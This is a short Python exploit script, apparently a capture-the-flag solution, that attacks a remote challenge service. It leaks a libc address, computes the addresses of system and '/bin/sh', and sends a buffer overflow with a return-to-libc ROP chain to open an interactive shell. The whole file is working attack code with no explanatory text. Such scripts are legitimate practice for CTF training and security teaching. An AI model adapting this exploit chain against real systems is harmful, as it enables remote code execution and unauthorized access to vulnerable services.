import sys
sys.dont_write_bytecode = True

from usefulFunction import *
from pwnscript import *

P = Remote('challenges.uactf.com.au', 30005)

P.get("Enter the pincode: ")

P.putline(2 ** 64)

P.get("I'm just going to help you out the tinyest bit.. 0x")

puts_got = int(P.getline().strip(), 16)

ret    = 0x401334
libc   = puts_got - 0x0084420
system = libc + 0x0052290
bin_sh = libc + 0x01b45bd


print(f"PUTS: {puts_got:#08x}")
print(f"LIBC: {libc:#08x}")

payload  = b"A" * 0x38
payload += pop_rdi(bin_sh)
payload += qword(ret)
payload += qword(system)

P.putline(payload)
P.interactive()
